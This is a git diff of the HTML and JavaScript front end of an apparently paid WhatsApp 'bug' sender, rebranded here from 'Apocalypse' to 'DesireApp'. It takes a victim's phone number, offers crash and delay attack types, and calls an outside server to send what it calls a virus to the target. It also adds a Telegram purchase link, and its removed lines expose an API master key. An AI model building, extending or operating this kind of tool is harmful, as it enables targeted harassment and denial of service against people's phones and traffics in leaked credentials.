@@ -1,14 +1,12 @@
-<!-- File: index.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>ApocalypseWeb</title>
+  <title>DesireApp</title>
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
   <style>
-    /* CSS-nya sama seperti sebelumnya, tidak diubah */
     :root { --main: #ffffff; --second: #cccccc; --bg: #0e0e0e; --text: #eeeeee; }
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Orbitron', sans-serif; }
     body {
@@ -29,8 +27,8 @@
     .profile { display: flex; align-items: center; gap: 15px; margin-bottom: 25px; }
     .profile img { width: 65px; height: 65px; border-radius: 50%; border: 2px solid var(--main); }
     .profile-info h2 { font-size: 1.2rem; color: var(--main); }
-    .status { font-size: 0.9rem; color: #bbbbbb; }
-    .status i { color: #ffffff; margin-right: 5px; }
+    .status { font-size: 0.9rem; color: #00ff00; }
+    .status i { color: #00ff00; margin-right: 5px; }
     h1 { font-size: 1.4rem; color: var(--main); margin-bottom: 20px; text-align: center; animation: neon 2s infinite alternate; }
     .neon {
       color: #0ff;
@@ -127,6 +125,15 @@
       color: #ff4d4d;
       cursor: pointer;
     }
+    .spinner {
+      width: 18px;
+      height: 18px;
+      border: 3px solid white;
+      border-top: 3px solid transparent;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
     @keyframes fadeIn {
       from { opacity: 0; transform: scale(0.9); }
       to { opacity: 1; transform: scale(1); }
@@ -147,6 +154,11 @@
   <input type="text" id="username" placeholder="Username" />
   <input type="password" id="password" placeholder="Password" />
   <button onclick="login()"><i class="fas fa-sign-in-alt"></i> Login</button>
+  <a href="https://t.me/WinzSeriez" target="_blank" style="text-decoration: none;">
+    <button style="margin-top: 10px; background: rgba(255,255,255,0.9); color: black; border-radius: 50px; padding: 14px; width: 100%; box-shadow: 0 0 12px white; font-size: 1rem;">
+      <i class="fas fa-shopping-cart"></i> Buy Akses
+    </button>
+  </a>
   <div id="login-result" style="margin-top:10px; text-align:center;"></div>
 </div>
 
@@ -158,30 +170,21 @@
       <span class="status"><i class="fas fa-circle"></i> Connected</span>
     </div>
   </div>
-  <h1 class="neon"><i class="fab fa-whatsapp"></i> Apocalypse</h1>
+  <h1 class="neon"><i class="fab fa-whatsapp"></i> DesireApp</h1>
   <input type="text" id="target" placeholder="628xxxx" />
   <div class="bug-options">
-    <div class="bug-card active" data-bug="crashtotal">
-      <i class="fas fa-skull-crossbones"></i><span>FC Invisible</span>
+    <div class="bug-card active" data-bug="crashtotal"><i class="fas fa-skull-crossbones"></i><span>FORCE CLOSE</span></div>
+    <div class="bug-card" data-bug="fc"><i class="fas fa-bomb"></i><span>CRASHED</span></div>
+    <div class="bug-card" data-bug="delay"><i class="fas fa-clock"></i><span>DELAY HARD</span></div>
+    <button id="sendBtn" onclick="sendBug()"><i class="fas fa-bug"></i> SEND BUG</button>
+    <button class="small-logout" onclick="logout()">Logout</button>
+    <div id="result" style="margin-top:10px;"></div>
+    <div class="contact" style="margin-top: 20px; color: white;">
+      <p>Contact Developer:</p>
+      <a href="https://t.me/WinzSeriez" target="_blank" style="color: #00acee; text-decoration: none;">
+        <i class="fab fa-telegram"></i> @WinzSeriez
+      </a>
     </div>
-    <div class="bug-card" data-bug="fc">
-      <i class="fas fa-bomb"></i><span>kontol WA</span>
-    </div>
-    <div class="bug-card" data-bug="delay">
-      <i class="fas fa-clock"></i><span>bangke Delay</span>
-    </div>
-    <div class="bug-card" data-bug="blank">
-      <i class="fas fa-eye-slash"></i><span>mmk WhatsApp</span>
-    </div>
-  </div>
-  <button id="sendBtn" onclick="sendBug()"><i class="fas fa-bug"></i> Kirim Bug</button>
-  <button class="small-logout" onclick="logout()">Logout</button>
-  <div id="result" style="margin-top:10px;"></div>
-  <div class="contact" style="margin-top: 20px; color: white;">
-    <p>Contact Developer:</p>
-    <a href="https://t.me/leakvjs" target="_blank" style="color: #00acee; text-decoration: none;">
-      <i class="fab fa-telegram"></i> @axpaw O`vovTzmxv
-    </a>
   </div>
 </div>
 
@@ -194,34 +197,41 @@ particlesJS("particles-js", {
     shape: { type: "circle" },
     opacity: { value: 0.4 },
     size: { value: 3, random: true },
-    line_linked: {
-      enable: true, distance: 150,
-      color: "#ffffff", opacity: 0.3, width: 1
-    },
-    move: { enable: true, speed: 2, direction: "none", random: false }
+    line_linked: { enable: true, distance: 150, color: "#ffffff", opacity: 0.3, width: 1 },
+    move: { enable: true, speed: 2 }
   },
   interactivity: {
-    events: {
-      onhover: { enable: true, mode: "grab" },
-      onclick: { enable: false }
-    },
+    events: { onhover: { enable: true, mode: "grab" } },
     modes: { grab: { distance: 200, line_linked: { opacity: 1 } } }
   },
   retina_detect: true
 });
 
-// ✅ JSONBin Data (Sudah Diganti)
-const BIN_ID = "687dac7b409bdb743a2f9bf9";
-const API_KEY = "$2a$10$SkWQ1rLPm7036plY7liAV.KxO10T2cT4IkVdjBFbwA4zvLzgkW6ay";
-const headers = {
-  "Content-Type": "application/json",
-  "X-Master-Key": API_KEY
-};
+const GITHUB_JSON_URL = "https://raw.githubusercontent.com/WinzSeries1/WinzPrivate/main/users.json";
+let selectedBug = "crashtotal";
+let cooldownEnd = null;
+let cooldownInterval = null;
 
-async function getUsers() {
-  const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers });
-  const data = await res.json();
-  return data.record;
+document.querySelectorAll(".bug-card").forEach(card => {
+  card.addEventListener("click", () => {
+    document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));
+    card.classList.add("active");
+    selectedBug = card.getAttribute("data-bug");
+  });
+});
+
+function showPopup(message) {
+  document.getElementById("popup-message").innerHTML = message;
+  document.getElementById("popup").style.display = "flex";
+  if (!message.includes("PLEASE WAIT")) {
+    setTimeout(() => closePopup(), 5000);
+  } else {
+    setTimeout(() => closePopup(), 3000);
+  }
+}
+
+function closePopup() {
+  document.getElementById("popup").style.display = "none";
 }
 
 function logout() {
@@ -242,13 +252,14 @@ window.onload = async () => {
   if (user) showDashboard(user);
 };
 
-function showPopup(message) {
-  document.getElementById("popup-message").innerHTML = message;
-  document.getElementById("popup").style.display = "flex";
-}
-
-function closePopup() {
-  document.getElementById("popup").style.display = "none";
+async function getUsers() {
+  try {
+    const res = await fetch(GITHUB_JSON_URL);
+    return await res.json();
+  } catch (err) {
+    console.error("❌ Gagal fetch user:", err);
+    return [];
+  }
 }
 
 async function login() {
@@ -257,7 +268,6 @@ async function login() {
   const result = document.getElementById("login-result");
   const users = await getUsers();
   const found = users.find(u => u.username === user && u.password === pass);
-
   if (found) {
     saveSession(found);
     showDashboard(found);
@@ -273,14 +283,22 @@ function showDashboard(user) {
   document.getElementById("userLabel").innerText = user.username;
 }
 
-let selectedBug = "crashtotal";
-document.querySelectorAll(".bug-card").forEach(card => {
-  card.addEventListener("click", () => {
-    document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));
-    card.classList.add("active");
-    selectedBug = card.getAttribute("data-bug");
-  });
-});
+function updateCooldownButton() {
+  const btn = document.getElementById("sendBtn");
+  const now = new Date();
+  if (cooldownEnd && now < cooldownEnd) {
+    const diff = cooldownEnd - now;
+    const mins = Math.floor(diff / 60000);
+    const secs = Math.floor((diff % 60000) / 1000);
+    btn.disabled = true;
+    btn.innerHTML = `<span class="spinner"></span> ${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+  } else {
+    btn.disabled = false;
+    btn.innerHTML = `<i class="fas fa-bug"></i> SEND BUG`;
+    clearInterval(cooldownInterval);
+    cooldownInterval = null;
+  }
+}
 
 async function sendBug() {
   const input = document.getElementById("target").value.trim();
@@ -293,23 +311,27 @@ async function sendBug() {
     return;
   }
 
+  if (cooldownEnd && new Date() < cooldownEnd) return;
+
   const chatId = input.includes("@s.whatsapp.net") ? input : `${input}@s.whatsapp.net`;
   btn.disabled = true;
-  const originalHTML = btn.innerHTML;
   btn.innerHTML = '<span class="spinner"></span> Mengirim...';
   resDiv.innerText = "";
+
+  showPopup("PLEASE WAIT A MOMENT<br>WE ARE PROCESSING TO SEND VIRUS TO THE TARGET");
 
   try {
     const res = await fetch(`https://cella-saja.mydigital-store.me/permen?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);
     const json = await res.json();
-    showPopup(`Apocalypse Bug successfully sent to <b>${input}</b>`);
+    document.getElementById("popup-message").innerHTML = `Apocalypse Bug successfully sent to <b>${input}</b>`;
+    cooldownEnd = new Date(new Date().getTime() + 30 * 60000);
+    cooldownInterval = setInterval(updateCooldownButton, 1000);
+    updateCooldownButton();
   } catch (err) {
     resDiv.innerText = "❌ Gagal fetch: " + err;
     resDiv.style.color = "crimson";
+    closePopup();
   }
-
-  btn.disabled = false;
-  btn.innerHTML = originalHTML;
 }
 </script>
 </body>
